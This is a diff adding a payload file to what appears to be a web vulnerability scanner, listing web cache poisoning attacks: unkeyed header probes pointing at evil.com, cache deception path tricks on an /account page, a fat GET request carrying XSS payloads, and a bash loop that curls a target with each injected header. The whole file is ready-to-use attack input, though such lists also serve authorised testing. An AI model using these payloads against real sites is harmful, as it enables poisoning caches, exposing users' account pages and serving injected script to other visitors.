@@ -1,0 +1,39 @@
+# Web Cache Poisoning Payloads — cyberm4fia-scanner
+# Categories: Unkeyed Headers, Cache Deception, Fat GET
+
+# ─── Unkeyed Header Probe ───
+X-Forwarded-Host: evil.com
+X-Forwarded-Scheme: http
+X-Forwarded-Proto: http
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-HTTP-Method-Override: DELETE
+X-Forwarded-Prefix: /evil
+X-Forwarded-Port: 8080
+
+# ─── Cache Deception (extension trick) ───
+/account.css
+/account/.css
+/account;x=.css
+/account%00.css
+/account%23.css
+/account%2f.css
+/account?x=y.css
+/account.js
+/account.jpg
+/account/test.css
+
+# ─── Fat GET ───
+GET /home HTTP/1.1
+Host: target.com
+Content-Length: 55
+
+search=<script>alert(1)</script>&utm=<img src=x onerror=alert(1)>
+
+# ─── Stored XSS via Cache ───
+# Unkeyed header reflected in body → inject payload → cached response to next visitor
+
+# ─── One-liner Header Probe ───
+for h in X-Forwarded-Host X-Forwarded-Scheme X-Forwarded-Proto X-Original-URL X-Rewrite-URL; do
+  curl -sk -H "$h: evil.com" "https://target.com/?cb=$RANDOM" -o /dev/null -w "$h %{http_code}\n"
+done
